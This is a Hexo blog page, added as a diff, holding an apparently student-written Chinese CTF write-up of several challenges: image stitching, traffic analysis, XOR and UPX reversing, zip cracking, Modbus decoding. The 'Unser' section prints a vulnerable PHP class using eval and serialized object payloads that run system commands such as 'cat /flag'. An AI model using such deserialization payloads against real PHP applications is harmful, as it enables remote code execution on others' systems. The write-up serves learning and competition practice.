@@ -1,0 +1,797 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chaye">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="可叹落叶飘零 1、先进行修改时间排序照片 2、有100张照片，可以猜一下是520还是1010的拼接方式 3、自己手动拼接后发现是10*10的拼接方式 4、这里其实可以直接手搓出信息 5、科学方法，用chat和python写出拼接代码 6、这里附上python代码 12345678910111213141516171819202122232425262728293031323334353637383">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Polis_wp">
+<meta property="og:url" content="http://example.com/2024/05/22/Polis_wp%20%E5%A4%A7%E4%B8%80%E4%B8%8B%E9%9B%86%E8%AE%AD/index.html">
+<meta property="og:site_name" content="chaye的博客">
+<meta property="og:description" content="可叹落叶飘零 1、先进行修改时间排序照片 2、有100张照片，可以猜一下是520还是1010的拼接方式 3、自己手动拼接后发现是10*10的拼接方式 4、这里其实可以直接手搓出信息 5、科学方法，用chat和python写出拼接代码 6、这里附上python代码 12345678910111213141516171819202122232425262728293031323334353637383">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42988179/1713364898233-44a2b52d-0cc9-45f4-9f3e-d5d785e1d392.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365173359-0cc990ef-fe0c-42de-9a9f-0c8698454679.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365347507-7e020a07-6f8c-4607-84ff-fdb4a2286bde.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713449882159-4259fe5b-8fc1-4574-b533-7be382b68416.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42988179/1713449967995-19d6ee84-4747-4cd8-9f1b-53d5070a256b.png?x-oss-process=image/format,webp/resize,w_1125,limit_0">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365748702-5b840a8c-f465-4c27-99ab-c21c974590da.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365851509-4bb923b0-04d9-4327-ad21-f0f010abe55d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714028942516-194b5071-8eb6-43c1-af15-923a496ca719.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714030177427-04fba69e-5d8c-4084-9c5c-8aa9ab80cb7f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714030324453-41846a08-4080-4afd-9ae0-ab68dfb5176b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714030531194-ce90d95b-6a39-488f-809e-097b9ef165b4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714031024584-a61d2452-9089-46e0-9b23-01c827883af2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714031054876-9476642a-7c11-4127-ae1a-a7e0be767381.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715686280504-6a947ce0-265c-4e72-b74b-204d8d1b8586.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715762228635-b627d676-ba94-483c-af87-8eb70cd7aa6e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715345844887-2bbeb874-b95d-4b5c-85c2-4ac3adb21071.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346268088-adbc470d-48be-4a6c-8fae-5a9a913746a1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346079436-69c3c2fd-4fad-44f7-aae6-569fd5418367.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346210848-1d15cf5c-be3e-4b4f-8af5-e9521674dfd9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346143397-2ea98a29-39a0-4dfe-9565-a9eacb5ee7fa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346113846-7d0a03e2-5199-4bcc-85b4-4365da244c46.png">
+<meta property="article:published_time" content="2024-05-22T14:15:25.000Z">
+<meta property="article:modified_time" content="2025-03-29T07:49:23.950Z">
+<meta property="article:author" content="chaye">
+<meta property="article:tag" content="2024比赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/42988179/1713364898233-44a2b52d-0cc9-45f4-9f3e-d5d785e1d392.png">
+  
+  
+  
+  <title>Polis_wp - chaye的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>chaye</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Polis_wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-22 22:15" pubdate>
+          May 22, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Polis_wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="可叹落叶飘零"><a href="#可叹落叶飘零" class="headerlink" title="可叹落叶飘零"></a>可叹落叶飘零</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1713364898233-44a2b52d-0cc9-45f4-9f3e-d5d785e1d392.png" srcset="/img/loading.gif" lazyload></p>
+<p>1、先进行修改时间排序照片</p>
+<p>2、有100张照片，可以猜一下是5<em>20还是10</em>10的拼接方式</p>
+<p>3、自己手动拼接后发现是10*10的拼接方式</p>
+<p>4、这里其实可以直接手搓出信息</p>
+<p>5、科学方法，用chat和python写出拼接代码</p>
+<p>6、这里附上python代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>from PIL import Image<br><br># 指定图片文件夹路径<br>folder_path = &quot;D:\\flag\\可叹，落叶飘零&quot;<br><br># 获取文件夹中所有png图片文件的路径<br>png_files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if f.endswith(&#x27;.png&#x27;)]<br><br># 按照修改日期排序文件列表<br>png_files.sort(key=lambda x: os.path.getmtime(x))<br><br># 动态计算新的大图片尺寸<br>total_images = len(png_files)<br>columns = 10<br>rows = (total_images + columns - 1) // columns<br>max_width = max_height = 0<br><br>for png_file in png_files:<br>    img = Image.open(png_file)<br>    width, height = img.size<br>    max_width = max(max_width, width)<br>    max_height = max(max_height, height)<br><br>result_width = max_width * columns<br>result_height = max_height * rows<br><br># 创建一个新的大图片<br>result_image = Image.new(&quot;RGB&quot;, (result_width, result_height))<br><br># 逐行拼接图片<br>x_offset = y_offset = 0<br>for idx, png_file in enumerate(png_files):<br>    img = Image.open(png_file)<br>    result_image.paste(img, (x_offset, y_offset))<br>    x_offset += max_width<br>    if (idx + 1) % columns == 0:<br>        x_offset = 0<br>        y_offset += max_height<br><br># 保存拼接后的图片<br>result_image.save(&quot;result_image.png&quot;)<br><br>print(&quot;图片拼接完成！&quot;)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365173359-0cc990ef-fe0c-42de-9a9f-0c8698454679.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、这里得到信息，文字识别不了，可能因为分辨率太低了，选择手搓</p>
+<p>8、不过提交发现并不是flag，所以这里猜测可能进行了base加密</p>
+<p>注意：可能会把l看成大I，如果是大I的话会解出乱码，试错后发现是l而不是大I</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365347507-7e020a07-6f8c-4607-84ff-fdb4a2286bde.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、进行解密后得到flag</p>
+<h2 id="手搓之神or脚本之神"><a href="#手搓之神or脚本之神" class="headerlink" title="手搓之神or脚本之神"></a>手搓之神or脚本之神</h2><p>1、用wireshark打开，按时间顺序进行请求方式的筛选  </p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713449882159-4259fe5b-8fc1-4574-b533-7be382b68416.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1713449967995-19d6ee84-4747-4cd8-9f1b-53d5070a256b.png?x-oss-process=image/format,webp/resize,w_1125,limit_0" srcset="/img/loading.gif" lazyload></p>
+<p>2、分析数据流，他是在进行sql碰撞得到flag的每一位ascll码，最后一次请求即为碰撞成功的ascll码值<br>3、转成字母数字得到flag<br>4、手搓之神有待python代码附上</p>
+<h2 id="xor-签到题"><a href="#xor-签到题" class="headerlink" title="xor 签到题"></a>xor 签到题</h2><p><font style="color:rgb(38, 38, 38);">1、先将xor放入IDA打开，f5看伪c代码</font><font style="color:rgb(38, 38, 38);"><br></font></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365748702-5b840a8c-f465-4c27-99ab-c21c974590da.png" srcset="/img/loading.gif" lazyload></p>
+<font style="color:rgb(38, 38, 38);">  
+</font><font style="color:rgb(38, 38, 38);">2、发现他是在跟5进行异或，u代表unsigned int,无符号整数 </font><font style="color:rgb(38, 38, 38);">  
+</font><font style="color:rgb(38, 38, 38);">3、随后写出python的异或代码，得出flag（这里好像不用考虑转义字符，只有一个\）</font><font style="color:rgb(38, 38, 38);">  
+</font>
+
+<p><font style="color:rgba(89, 89, 89, 0.5);background-color:rgb(245, 245, 245);">Plain Text</font><font style="color:rgb(88, 90, 90);background-color:rgb(245, 245, 245);">复制代码</font></p>
+<p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">1</font></p>
+<p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">2</font></p>
+<p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">3</font></p>
+<p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">4</font></p>
+<p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">5</font></p>
+<p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">result&#x3D; ‘cidb~\5pZnk5rZ}56x’</font></p>
+<p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">flag&#x3D; ‘’</font></p>
+<p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">for i in range(len(result)):</font></p>
+<p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);"> print(chr((ord(result[i]))^5),end&#x3D;’’)</font></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1713365851509-4bb923b0-04d9-4327-ad21-f0f010abe55d.png" srcset="/img/loading.gif" lazyload></p>
+<font style="color:rgb(38, 38, 38);">  
+</font><font style="color:rgb(38, 38, 38);">  
+</font>
+
+  
+
+
+
+
+<h2 id="ez-wireshark-1"><a href="#ez-wireshark-1" class="headerlink" title="ez_wireshark_1"></a><font style="color:rgb(33, 37, 41);">ez_wireshark_1</font></h2><p>1、先打开流量</p>
+<p>2、直接明文搜索flag，得到</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714028942516-194b5071-8eb6-43c1-af15-923a496ca719.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ez-wireshark-2"><a href="#ez-wireshark-2" class="headerlink" title="ez_wireshark_2"></a><font style="color:rgb(33, 37, 41);">ez_wireshark_2</font></h2><p>1、流量里面发现有个被加密的flag.txt</p>
+<p>2、跟踪数据流（注意这里不能直接复制，要查看原始数据，发现文件名开头的数据为504b0304），504b0506为结尾，后还有18个字节，本题刚好到最后一个字节为18个<img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714030177427-04fba69e-5d8c-4084-9c5c-8aa9ab80cb7f.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、复制16进制数据放入010中生成zip文件，发现里面有加密的txt文件</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714030324453-41846a08-4080-4afd-9ae0-ab68dfb5176b.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、用ARCHPR进行字典解密,得到密钥</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714030531194-ce90d95b-6a39-488f-809e-097b9ef165b4.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、输入密钥得到flag</p>
+<h2 id="生产流量分析"><a href="#生产流量分析" class="headerlink" title="生产流量分析"></a><font style="color:rgb(33, 37, 41);">生产流量分析</font></h2><p>1、打开流量，根据modbus进行筛选</p>
+<p>2、根据modbus数据流发现可疑数据</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714031024584-a61d2452-9089-46e0-9b23-01c827883af2.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、手搓下来，进行base32解码得到flag</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1714031054876-9476642a-7c11-4127-ae1a-a7e0be767381.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="upx-and-base-64-change"><a href="#upx-and-base-64-change" class="headerlink" title="upx and base 64 change"></a>upx and base 64 change</h2><p>1、拖入010发现标识符被改，将其改成大写的UPX，在进行脱壳</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715686280504-6a947ce0-265c-4e72-b74b-204d8d1b8586.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、放入exeinfo里面进行查壳，packed，32bit</p>
+<p>用upx进行脱壳</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715762228635-b627d676-ba94-483c-af87-8eb70cd7aa6e.png" srcset="/img/loading.gif" lazyload></p>
+<p>再看一下壳已经消失</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715345844887-2bbeb874-b95d-4b5c-85c2-4ac3adb21071.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、直接放32位IDA里面</p>
+<p>F5可以先找找main函数，发现密文</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346268088-adbc470d-48be-4a6c-8fae-5a9a913746a1.png" srcset="/img/loading.gif" lazyload><br>4、题目提示是base64的变形题，shift F12找到密文和密钥</p>
+<p>5、发现两个密钥进行尝试解密，提示词crypto</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346079436-69c3c2fd-4fad-44f7-aae6-569fd5418367.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346210848-1d15cf5c-be3e-4b4f-8af5-e9521674dfd9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346143397-2ea98a29-39a0-4dfe-9565-a9eacb5ee7fa.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715346113846-7d0a03e2-5199-4bcc-85b4-4365da244c46.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Unser"><a href="#Unser" class="headerlink" title="Unser"></a>Unser</h2><?php
+
+highlight_file(__FILE__);
+
+class pop {
+
+public $ClassObj;
+
+function __construct() {
+
+$this->ClassObj = new hello();
+
+}
+
+function __destruct() {
+
+$this->ClassObj->action();
+
+}
+
+}
+
+class hello {
+
+function action() {
+
+echo "hello pop ";
+
+}
+
+}
+
+class shell {
+
+public $data;
+
+function action() {
+
+eval($this->data);
+
+}
+
+}
+
+$a = new pop();
+
+@unserialize($_GET['s']);
+
+hello pop
+
+这里可以看到 ->eval($this->data); 
+
+这里可以看到action（）方法可以运行传入的data的代码
+
+由原运行结果可知反序列化之后先执行的是pop-> 所以要让ClassObj为shell类型->再将shell中data的值变为想要的代码
+
+O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:13:"system("ls");";}} 先看看目录
+
+![](https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715761658742-691e8693-6a69-4125-ba0b-a11749231d08.png)
+
+O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:15:"system("ls /");";}} 再看看根目录 找到flag
+
+![](https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715761691802-127e6304-f286-4520-bd23-3a103507438d.png)
+
+然后就是查看flag的内容了
+
+O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:20:"system("cat /flag");";}}
+
+![](https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1715761767491-2a916546-5286-4ec5-8a11-ad1625ab2343.png)
+
+cat +文件路径即可
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/2024%E6%AF%94%E8%B5%9B/" class="print-no-link">#2024比赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Polis_wp</div>
+      <div>http://example.com/2024/05/22/Polis_wp 大一下集训/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>chaye</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 22, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/25/XXE-XML/" title="XXE-XML">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XXE-XML</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/21/wifi%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" title="wifi流量爆破">
+                        <span class="hidden-mobile">wifi流量爆破</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
